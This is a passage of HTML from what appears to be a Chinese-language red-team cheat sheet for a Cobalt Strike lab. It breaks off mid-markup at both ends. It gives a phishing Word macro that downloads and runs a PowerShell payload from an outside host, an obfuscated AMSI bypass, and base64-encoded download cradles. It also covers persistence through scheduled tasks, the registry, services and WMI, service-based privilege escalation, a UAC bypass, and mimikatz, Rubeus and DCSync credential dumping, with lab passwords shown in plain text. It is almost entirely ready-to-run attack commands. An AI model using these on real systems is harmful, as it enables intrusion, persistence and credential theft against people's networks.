class="hljs-literal">-Password</span> Summer2022<br><br><span class="hljs-comment"># Use Identified credentials to download Global Address List</span><br><span class="hljs-built_in">ps</span>&gt; <span class="hljs-built_in">Get-GlobalAddressList</span> <span class="hljs-literal">-ExchHostname</span> mail.cyberbotic.io <span class="hljs-literal">-UserName</span> cyberbotic.io\iyates <span class="hljs-literal">-Password</span> Summer2022 <span class="hljs-literal">-OutFile</span> .\Desktop\gal.txt<br></code></pre></td></tr></table></figure>

<ul>
<li>创建嵌入宏的恶意 Office 文件</li>
</ul>
<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><code class="hljs powershell"><span class="hljs-comment"># Step 1: Open a blank word document &quot;Document1&quot;. Navigate to  View &gt; Macros &gt; Create. Changes macros in to Document1. Name the default macro function as AutoOpen. Paste the below content and run for testing</span><br><br>Sub AutoOpen()<br><br>  Dim Shell As Object<br>  <span class="hljs-built_in">Set</span> Shell = CreateObject(<span class="hljs-string">&quot;wscript.shell&quot;</span>)<br>  Shell.Run <span class="hljs-string">&quot;notepad&quot;</span><br><br><span class="hljs-keyword">End</span> Sub<br><br><span class="hljs-comment"># Step 2: Generate a payload for web delivery (Attacks &gt; Scripted Web Delivery (S) and generate a 64-bit PowerShell payload with your HTTP/DNS listener). Balance the number of quotes</span><br><br>Sub AutoOpen()<br><br>  Dim Shell As Object<br>  <span class="hljs-built_in">Set</span> Shell = CreateObject(<span class="hljs-string">&quot;wscript.shell&quot;</span>)<br>	Shell.Run <span class="hljs-string">&quot;powershell.exe -nop -w hidden -c &quot;</span><span class="hljs-string">&quot;IEX ((new-object net.webclient).downloadstring(&#x27;http://nickelviper.com/a&#x27;))&quot;</span><span class="hljs-string">&quot;&quot;</span><br><br><span class="hljs-keyword">End</span> Sub<br><br><span class="hljs-comment"># Step 3: Save the document as .doc file and send it as phising email</span><br><br><span class="hljs-comment"># AMSI BYPASS :  Use AMSI Bypass with above payload if required, </span><br><span class="hljs-comment"># Save below one liner to a ps1 file and host it on cobalt strike and use Powershell IEX to fetch and run it in memory to bypass AMSI.</span><br><br>S`eT<span class="hljs-literal">-It</span>`em ( <span class="hljs-string">&#x27;V&#x27;</span>+<span class="hljs-string">&#x27;aR&#x27;</span> +  <span class="hljs-string">&#x27;IA&#x27;</span> + (<span class="hljs-string">&#x27;blE:1&#x27;</span>+<span class="hljs-string">&#x27;q2&#x27;</span>)  + (<span class="hljs-string">&#x27;uZ&#x27;</span>+<span class="hljs-string">&#x27;x&#x27;</span>)  ) ( [<span class="hljs-type">TYpE</span>](  <span class="hljs-string">&quot;&#123;1&#125;&#123;0&#125;&quot;</span><span class="hljs-operator">-F</span><span class="hljs-string">&#x27;F&#x27;</span>,<span class="hljs-string">&#x27;rE&#x27;</span>  ) )  ;    (    <span class="hljs-built_in">Get-varI</span>`A`BLE  ( (<span class="hljs-string">&#x27;1Q&#x27;</span>+<span class="hljs-string">&#x27;2U&#x27;</span>)  +<span class="hljs-string">&#x27;zX&#x27;</span>  )  <span class="hljs-literal">-VaL</span>  ).<span class="hljs-string">&quot;A`ss`Embly&quot;</span>.<span class="hljs-string">&quot;GET`TY`Pe&quot;</span>((  <span class="hljs-string">&quot;&#123;6&#125;&#123;3&#125;&#123;1&#125;&#123;4&#125;&#123;2&#125;&#123;0&#125;&#123;5&#125;&quot;</span> <span class="hljs-operator">-f</span>(<span class="hljs-string">&#x27;Uti&#x27;</span>+<span class="hljs-string">&#x27;l&#x27;</span>),<span class="hljs-string">&#x27;A&#x27;</span>,(<span class="hljs-string">&#x27;Am&#x27;</span>+<span class="hljs-string">&#x27;si&#x27;</span>),(<span class="hljs-string">&#x27;.Man&#x27;</span>+<span class="hljs-string">&#x27;age&#x27;</span>+<span class="hljs-string">&#x27;men&#x27;</span>+<span class="hljs-string">&#x27;t.&#x27;</span>),(<span class="hljs-string">&#x27;u&#x27;</span>+<span class="hljs-string">&#x27;to&#x27;</span>+<span class="hljs-string">&#x27;mation.&#x27;</span>),<span class="hljs-string">&#x27;s&#x27;</span>,(<span class="hljs-string">&#x27;Syst&#x27;</span>+<span class="hljs-string">&#x27;em&#x27;</span>)  ) ).<span class="hljs-string">&quot;g`etf`iElD&quot;</span>(  ( <span class="hljs-string">&quot;&#123;0&#125;&#123;2&#125;&#123;1&#125;&quot;</span> <span class="hljs-operator">-f</span>(<span class="hljs-string">&#x27;a&#x27;</span>+<span class="hljs-string">&#x27;msi&#x27;</span>),<span class="hljs-string">&#x27;d&#x27;</span>,(<span class="hljs-string">&#x27;I&#x27;</span>+<span class="hljs-string">&#x27;nitF&#x27;</span>+<span class="hljs-string">&#x27;aile&#x27;</span>)  ),(  <span class="hljs-string">&quot;&#123;2&#125;&#123;4&#125;&#123;0&#125;&#123;1&#125;&#123;3&#125;&quot;</span> <span class="hljs-operator">-f</span> (<span class="hljs-string">&#x27;S&#x27;</span>+<span class="hljs-string">&#x27;tat&#x27;</span>),<span class="hljs-string">&#x27;i&#x27;</span>,(<span class="hljs-string">&#x27;Non&#x27;</span>+<span class="hljs-string">&#x27;Publ&#x27;</span>+<span class="hljs-string">&#x27;i&#x27;</span>),<span class="hljs-string">&#x27;c&#x27;</span>,<span class="hljs-string">&#x27;c,&#x27;</span>  )).<span class="hljs-string">&quot;sE`T`VaLUE&quot;</span>(  <span class="hljs-variable">$</span>&#123;n`ULl&#125;,<span class="hljs-variable">$</span>&#123;t`RuE&#125; )<br><br><span class="hljs-comment"># Like below, It can also be combined with above Macro</span><br><br>Shell.Run <span class="hljs-string">&quot;powershell.exe -nop -w hidden -c &quot;</span><span class="hljs-string">&quot;IEX ((new-object net.webclient).downloadstring(&#x27;http://nickelviper.com/amsi-bypass.ps1&#x27;)) ; IEX ((new-object net.webclient).downloadstring(&#x27;http://nickelviper.com/a&#x27;))&quot;</span><span class="hljs-string">&quot;&quot;</span><br></code></pre></td></tr></table></figure>

<h3 id="主机侦察"><a href="#主机侦察" class="headerlink" title="主机侦察"></a>主机侦察</h3><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><code class="hljs powershell"><span class="hljs-comment"># Identify running process like AV, EDR or any monitoring and logging solution</span><br>beacon&gt; <span class="hljs-built_in">ps</span><br><span class="hljs-comment"># Check default process for fork &amp; run</span><br>beacon&gt; powerpick <span class="hljs-built_in">Get-Process</span> <span class="hljs-literal">-Id</span> <span class="hljs-variable">$pid</span> | <span class="hljs-built_in">select</span> ProcessName<br><br><span class="hljs-comment"># Use Seatbealt to enumerate about system</span><br>beacon&gt; execute<span class="hljs-literal">-assembly</span> C:\Tools\Seatbelt\Seatbelt\bin\Release\Seatbelt.exe <span class="hljs-literal">-group</span>=system<br><br><span class="hljs-comment"># Screenshot, Clipboard, Keylogger and User Sessions of currently logged in user</span><br>beacon&gt; screenshot<br>beacon&gt; clipboard<br>beacon&gt; net logons<br><br>beacon&gt; keylogger<br>beacon&gt; job<br>beacon&gt; jobkill <span class="hljs-number">3</span><br></code></pre></td></tr></table></figure>

<h3 id="主机持久性（普通-特权）"><a href="#主机持久性（普通-特权）" class="headerlink" title="主机持久性（普通 + 特权）"></a>主机持久性（普通 + 特权）</h3><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br></pre></td><td class="code"><pre><code class="hljs powershell"><span class="hljs-comment"># Default location for powershell</span><br>C:\windows\syswow64\windowspowershell\v1.<span class="hljs-number">0</span>\powershell<br>C:\Windows\System32\WindowsPowerShell\v1.<span class="hljs-number">0</span>\powershell<br><br><span class="hljs-comment"># Encode the payload for handling extra quotes </span><br><br><span class="hljs-comment"># Powershell</span><br><span class="hljs-built_in">PS</span> C:\&gt; <span class="hljs-variable">$str</span> = <span class="hljs-string">&#x27;IEX ((new-object net.webclient).downloadstring(&quot;http://nickelviper.com/a&quot;))&#x27;</span><br><span class="hljs-built_in">PS</span> C:\&gt; [<span class="hljs-type">System.Convert</span>]::ToBase64String([<span class="hljs-type">System.Text.Encoding</span>]::Unicode.GetBytes(<span class="hljs-variable">$str</span>))<br><br><span class="hljs-comment">#Linux </span><br><span class="hljs-variable">$</span> <span class="hljs-built_in">echo</span> <span class="hljs-literal">-n</span> <span class="hljs-string">&quot;IEX(New-Object Net.WebClient).downloadString(&#x27;http://10.10.14.31/shell.ps1&#x27;)&quot;</span> | iconv <span class="hljs-literal">-t</span> UTF<span class="hljs-literal">-16LE</span> | base64 <span class="hljs-literal">-w</span> <span class="hljs-number">0</span><br><br><span class="hljs-comment"># Final Command</span><br>powershell <span class="hljs-literal">-nop</span> <span class="hljs-literal">-enc</span> &lt;BASE64_ENCODED_PAYLOAD&gt;<br><br><span class="hljs-comment"># ---------------------------------------------------------------------------------</span><br><br><span class="hljs-comment"># Common userland persistence methods include -</span><br><span class="hljs-comment"># HKCU / HKLM Registry Autoruns,</span><br><span class="hljs-comment"># Scheduled Tasks,</span><br><span class="hljs-comment"># Startup Folder</span><br><br><span class="hljs-comment"># CobaltStrike AggressorScripts for Persistence</span><br><span class="hljs-comment"># Copy the aggressor script cna code and paste in the Attacker machine and also copy the sharpersist.exe from Attacker machine Tools and put in the same directory as of persistence cna file.</span><br>https://github.com/Peco602/cobaltstrike<span class="hljs-literal">-aggressor-scripts</span>/tree/main/persistence<span class="hljs-literal">-sharpersist</span><br><span class="hljs-comment"># Tip : Windows Service Peristence with a onDisk Executable is most reliable in lab (Need Priv to configure)</span><br><br><span class="hljs-comment"># Persistance - Task Scheduler</span><br><span class="hljs-comment"># Persistance hourly</span><br>beacon&gt; execute<span class="hljs-literal">-assembly</span> C:\Tools\SharPersist\SharPersist\bin\Release\SharPersist.exe <span class="hljs-literal">-t</span> schtask <span class="hljs-literal">-c</span> <span class="hljs-string">&quot;C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe&quot;</span> <span class="hljs-literal">-a</span> <span class="hljs-string">&quot;-nop -w hidden -enc SQBFAFgAIAAoAC...GEAIgApACkA&quot;</span> <span class="hljs-literal">-n</span> <span class="hljs-string">&quot;Updater&quot;</span> <span class="hljs-literal">-m</span> add <span class="hljs-literal">-o</span> hourly<br><span class="hljs-comment"># Persistance on Logon (Need Admin Privileges)</span><br>beacon&gt; execute<span class="hljs-literal">-assembly</span> C:\Tools\SharPersist\SharPersist\bin\Release\SharPersist.exe <span class="hljs-literal">-t</span> schtask <span class="hljs-literal">-c</span> <span class="hljs-string">&quot;C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe&quot;</span> <span class="hljs-literal">-a</span> <span class="hljs-string">&quot;-nop -w hidden -enc SQBFAFgAIAAoAC...GEAIgApACkA&quot;</span> <span class="hljs-literal">-n</span> <span class="hljs-string">&quot;Updater&quot;</span> <span class="hljs-literal">-m</span> add <span class="hljs-literal">-o</span> logon<br><br><span class="hljs-comment"># Persistance - Startup Folder</span><br><span class="hljs-built_in">PS</span> C:\&gt; <span class="hljs-variable">$str</span> = <span class="hljs-string">&quot;IEX ((new-object net.webclient).downloadstring(&#x27;http://nickelviper.com/amsi-bypass.ps1&#x27;)) ; IEX ((new-object net.webclient).downloadstring(&#x27;http://nickelviper.com/a&#x27;))&quot;</span><br><span class="hljs-built_in">PS</span> C:\&gt; [<span class="hljs-type">System.Convert</span>]::ToBase64String([<span class="hljs-type">System.Text.Encoding</span>]::Unicode.GetBytes(<span class="hljs-variable">$str</span>))<br>beacon&gt; execute<span class="hljs-literal">-assembly</span> C:\Tools\SharPersist\SharPersist\bin\Release\SharPersist.exe <span class="hljs-literal">-t</span> startupfolder <span class="hljs-literal">-c</span> <span class="hljs-string">&quot;C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe&quot;</span> <span class="hljs-literal">-a</span> <span class="hljs-string">&quot;-nop -w hidden -enc SQBFAFgAIAAoACgAbgBlAHcALQBvAGIAagBlAGMAdAAgAG4AZQB0AC4AdwBlAGIAYwBsAGkAZQBuAHQAKQAuAGQAbwB3AG4AbABvAGEAZABzAHQAcgBpAG4AZwAoACcAaAB0AHQAcAA6AC8ALwBuAGkAYwBrAGUAbAB2AGkAcABlAHIALgBjAG8AbQAvAGEAbQBzAGkALQBiAHkAcABhAHMAcwAuAHAAcwAxACcAKQApACAAOwAgAEkARQBYACAAKAAoAG4AZQB3AC0AbwBiAGoAZQBjAHQAIABuAGUAdAAuAHcAZQBiAGMAbABpAGUAbgB0ACkALgBkAG8AdwBuAGwAbwBhAGQAcwB0AHIAaQBuAGcAKAAnAGgAdAB0AHAAOgAvAC8AbgBpAGMAawBlAGwAdgBpAHAAZQByAC4AYwBvAG0ALwBhACcAKQApAA==&quot;</span> <span class="hljs-operator">-f</span> <span class="hljs-string">&quot;UserEnvSetup&quot;</span> <span class="hljs-literal">-m</span> add <br><br><span class="hljs-comment"># Persistance - Registry Autorun</span><br>beacon&gt; <span class="hljs-built_in">cd</span> C:\ProgramData<br>beacon&gt; upload C:\Payloads\http_x64.exe<br>beacon&gt; <span class="hljs-built_in">mv</span> http_x64.exe Updater.exe<br>beacon&gt; execute<span class="hljs-literal">-assembly</span> C:\Tools\SharPersist\SharPersist\bin\Release\SharPersist.exe <span class="hljs-literal">-t</span> reg <span class="hljs-literal">-c</span> <span class="hljs-string">&quot;C:\ProgramData\Updater.exe&quot;</span> <span class="hljs-literal">-a</span> <span class="hljs-string">&quot;/q /n&quot;</span> <span class="hljs-literal">-k</span> <span class="hljs-string">&quot;hkcurun&quot;</span> <span class="hljs-literal">-v</span> <span class="hljs-string">&quot;Updater&quot;</span> <span class="hljs-literal">-m</span> add<br><br><span class="hljs-comment"># Persistance COM Hijacks</span><br><br><span class="hljs-comment"># Persistance - Privilleged System User</span><br><br><span class="hljs-comment"># Windows Service</span><br>beacon&gt; <span class="hljs-built_in">cd</span> C:\Windows<br>beacon&gt; upload C:\Payloads\tcp<span class="hljs-literal">-local_x64</span>.svc.exe<br>beacon&gt; <span class="hljs-built_in">mv</span> tcp<span class="hljs-literal">-local_x64</span>.svc.exe legit<span class="hljs-literal">-svc</span>.exe<br>beacon&gt; execute<span class="hljs-literal">-assembly</span> C:\Tools\SharPersist\SharPersist\bin\Release\SharPersist.exe <span class="hljs-literal">-t</span> service <span class="hljs-literal">-c</span> <span class="hljs-string">&quot;C:\Windows\legit-svc.exe&quot;</span> <span class="hljs-literal">-n</span> <span class="hljs-string">&quot;legit-svc&quot;</span> <span class="hljs-literal">-m</span> add<br><br><span class="hljs-comment"># Register WMI event to trigger our payload</span><br>beacon&gt; <span class="hljs-built_in">cd</span> C:\Windows<br>beacon&gt; upload C:\Payloads\dns_x64.exe<br>beacon&gt; powershell<span class="hljs-literal">-import</span> C:\Tools\PowerLurk.ps1<br>beacon&gt; powershell <span class="hljs-built_in">Register-MaliciousWmiEvent</span> <span class="hljs-literal">-EventName</span> WmiBackdoor <span class="hljs-literal">-PermanentCommand</span> <span class="hljs-string">&quot;C:\Windows\dns_x64.exe&quot;</span> <span class="hljs-literal">-Trigger</span> ProcessStart <span class="hljs-literal">-ProcessName</span> notepad.exe<br><br><span class="hljs-comment"># TIP : Use a beacon with slow check-in and spawn a new Session from it , So that it can be later used as lifeline.</span><br>beacon&gt; spawn x64 http<br>beacon&gt; inject <span class="hljs-number">4464</span> x64 http<br><span class="hljs-comment"># Create a new Session (child of current process) using spawn or shspawn.</span><br>beacon&gt; spawn x64 http<br>beacon&gt; shspawn x64 C:\Payloads\msf_http_x64.bin<br><span class="hljs-comment"># Inject a full Beacon payload for the specified listener using inject or shinject.</span><br>beacon&gt; inject <span class="hljs-number">4464</span> x64 tcp<span class="hljs-literal">-local</span><br>beacon&gt; execute C:\Windows\System32\notepad.exe<br>beacon&gt; <span class="hljs-built_in">ps</span><br>beacon&gt; shinject &lt;PID&gt; x64 msf.bin<br></code></pre></td></tr></table></figure>

<h3 id="主机权限提升"><a href="#主机权限提升" class="headerlink" title="主机权限提升"></a>主机权限提升</h3><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br></pre></td><td class="code"><pre><code class="hljs powershell"><span class="hljs-comment"># Query and Manage all the installed services</span><br>beacon&gt; powershell <span class="hljs-built_in">Get-Service</span> | <span class="hljs-built_in">fl</span><br>beacon&gt; run wmic service get name, pathname<br>beacon&gt; run <span class="hljs-built_in">sc</span> query<br>beacon&gt; run <span class="hljs-built_in">sc</span> qc VulnService2<br>beacon&gt; run <span class="hljs-built_in">sc</span> stop VulnService1<br>beacon&gt; run <span class="hljs-built_in">sc</span> <span class="hljs-built_in">start</span> VulnService1<br><br><span class="hljs-comment"># Use SharpUp to find exploitable services</span><br>beacon&gt; execute<span class="hljs-literal">-assembly</span> C:\Tools\SharpUp\SharpUp\bin\Release\SharpUp.exe audit <br><br><span class="hljs-comment"># CASE 1: Unquoted Service Path (Hijack the service binary search logic to execute our payload)</span><br>beacon&gt; execute<span class="hljs-literal">-assembly</span> C:\Tools\SharpUp\SharpUp\bin\Release\SharpUp.exe audit UnquotedServicePath<br>beacon&gt; powershell <span class="hljs-built_in">Get-Acl</span> <span class="hljs-literal">-Path</span> <span class="hljs-string">&quot;C:\Program Files\Vulnerable Services&quot;</span> | <span class="hljs-built_in">fl</span><br>beacon&gt; <span class="hljs-built_in">cd</span> C:\Program Files\Vulnerable Services<br>beacon&gt; upload C:\Payloads\tcp<span class="hljs-literal">-local_x64</span>.svc.exe<br>beacon&gt; <span class="hljs-built_in">mv</span> tcp<span class="hljs-literal">-local_x64</span>.svc.exe Service.exe<br>beacon&gt; run <span class="hljs-built_in">sc</span> stop VulnService1<br>beacon&gt; run <span class="hljs-built_in">sc</span> <span class="hljs-built_in">start</span> VulnService1<br>beacon&gt; connect localhost <span class="hljs-number">4444</span><br><br><span class="hljs-comment"># CASE 2: Weak Service Permission (Possible to modify service configuration)</span><br>beacon&gt; execute<span class="hljs-literal">-assembly</span> C:\Tools\SharpUp\SharpUp\bin\Release\SharpUp.exe audit ModifiableServices<br>beacon&gt; powershell<span class="hljs-literal">-import</span> C:\Tools\<span class="hljs-built_in">Get-ServiceAcl</span>.ps1<br>beacon&gt; powershell <span class="hljs-built_in">Get-ServiceAcl</span> <span class="hljs-literal">-Name</span> VulnService2 | <span class="hljs-built_in">select</span> <span class="hljs-literal">-expand</span> Access<br>beacon&gt; run <span class="hljs-built_in">sc</span> qc VulnService2<br>beacon&gt; mkdir C:\Temp<br>beacon&gt; <span class="hljs-built_in">cd</span> C:\Temp<br>beacon&gt; upload C:\Payloads\tcp<span class="hljs-literal">-local_x64</span>.svc.exe<br>beacon&gt; run <span class="hljs-built_in">sc</span> config VulnService2 binPath= C:\Temp\tcp<span class="hljs-literal">-local_x64</span>.svc.exe<br>beacon&gt; run <span class="hljs-built_in">sc</span> qc VulnService2<br>beacon&gt; run <span class="hljs-built_in">sc</span> stop VulnService2<br>beacon&gt; run <span class="hljs-built_in">sc</span> <span class="hljs-built_in">start</span> VulnService2<br>beacon&gt; connect localhost <span class="hljs-number">4444</span><br><br><span class="hljs-comment"># CASE 3: Weak Service Binary Permission (Overwite the service binary due to weak permission)</span><br>beacon&gt; execute<span class="hljs-literal">-assembly</span> C:\Tools\SharpUp\SharpUp\bin\Release\SharpUp.exe audit ModifiableServices<br>beacon&gt; powershell <span class="hljs-built_in">Get-Acl</span> <span class="hljs-literal">-Path</span> <span class="hljs-string">&quot;C:\Program Files\Vulnerable Services\Service 3.exe&quot;</span> | <span class="hljs-built_in">fl</span><br><span class="hljs-built_in">PS</span> C:\Payloads&gt; <span class="hljs-built_in">copy</span> <span class="hljs-string">&quot;tcp-local_x64.svc.exe&quot;</span> <span class="hljs-string">&quot;Service 3.exe&quot;</span><br>beacon&gt; run <span class="hljs-built_in">sc</span> stop VulnService3<br>beacon&gt; <span class="hljs-built_in">cd</span> <span class="hljs-string">&quot;C:\Program Files\Vulnerable Services&quot;</span><br>beacon&gt; upload C:\Payloads\Service3.exe<br>beacon&gt; run <span class="hljs-built_in">sc</span> <span class="hljs-built_in">start</span> VulnService3<br>beacon&gt; connect localhost <span class="hljs-number">4444</span><br><br><span class="hljs-comment"># UAC Bypass</span><br>beacon&gt; run whoami /groups<br>beacon&gt; elevate uac<span class="hljs-literal">-schtasks</span> tcp<span class="hljs-literal">-local</span><br>beacon&gt; run netstat <span class="hljs-literal">-anop</span> tcp<br>beacon&gt; connect localhost <span class="hljs-number">4444</span><br></code></pre></td></tr></table></figure>

<h3 id="凭证盗窃"><a href="#凭证盗窃" class="headerlink" title="凭证盗窃"></a>凭证盗窃</h3><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><code class="hljs powershell"><span class="hljs-comment"># &quot;!&quot; symbol is used to run command in elevated context of System User</span><br><span class="hljs-comment"># &quot;@&quot; symbol is used to impersonate beacon thread token</span><br><br><span class="hljs-comment"># Dump TGT/TGS Tickets</span><br>beacon&gt; mimikatz !sekurlsa::tickets<br>beacon&gt; execute<span class="hljs-literal">-assembly</span> C:\Tools\Rubeus\Rubeus\bin\Release\Rubeus.exe triage<br>beacon&gt; execute<span class="hljs-literal">-assembly</span> C:\Tools\Rubeus\Rubeus\bin\Release\Rubeus.exe dump /luid:<span class="hljs-number">0</span>x14794e /nowrap<br>beacon&gt; execute<span class="hljs-literal">-assembly</span> C:\Tools\Rubeus\Rubeus\bin\Release\Rubeus.exe monitor /interval:<span class="hljs-number">10</span> /nowrap<br><br><span class="hljs-comment"># Dump the local SAM database </span><br>beacon&gt; mimikatz !lsadump::sam<br><br><span class="hljs-comment"># Dump the logon passwords (Plain Text + Hashes) from LSASS.exe for currently logged on users</span><br>beacon&gt; mimikatz !sekurlsa::logonpasswords<br><br><span class="hljs-comment"># Dump the encryption keys used by Kerberos of logged on users (hashes incorrectly labelled as des_cbc_md4)</span><br>beacon&gt; mimikatz !sekurlsa::ekeys<br><br><span class="hljs-comment"># Dump Domain Cached Credentials (cannotbe be used for lateral movement unless cracked as the hash format is not NTLM so it can&#x27;t be used with pass the hash)</span><br><span class="hljs-comment"># https://www.ired.team/offensive-security/credential-access-and-credential-dumping/dumping-and-cracking-mscash-cached-domain-credentials#cracking-mscash-mscache-with-hashcat</span><br>beacon&gt; mimikatz !lsadump::cache<br><br><span class="hljs-comment"># List the kerberos tickets cached in current logon session or all logon session (privileged session)</span><br>beacon&gt; execute<span class="hljs-literal">-assembly</span> C:\Tools\Rubeus\Rubeus\bin\Release\Rubeus.exe triage<br><br><span class="hljs-comment"># Dump the TGT Ticket from given Logon Session (LUID)</span><br>beacon&gt; execute<span class="hljs-literal">-assembly</span> C:\Tools\Rubeus\Rubeus\bin\Release\Rubeus.exe dump /luid:<span class="hljs-number">0</span>x7049f /service:krbtgt<br><br><span class="hljs-comment"># DC Sync</span><br>beacon&gt; make_token DEV\nlamb F3rrari<br>beacon&gt; dcsync dev.cyberbotic.io DEV\krbtgt<br>beacon&gt; mimikatz !lsadump::dcsync /all /domain:dev.cyberbotic.io<br><span class="hljs-comment"># Dump krbtgt hash from DC (locally)</span><br>beacon&gt; mimikatz !lsadump::lsa /inject /name:krbtgt<br></code></pre></td></tr></table></figure>

<h3 id="领域侦察"><a href="#领域侦察" class="headerlink" title="领域侦察"></a>领域侦察</h3><ul>
<li>使用 Power View 进行域侦察</li>
</ul>
<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span 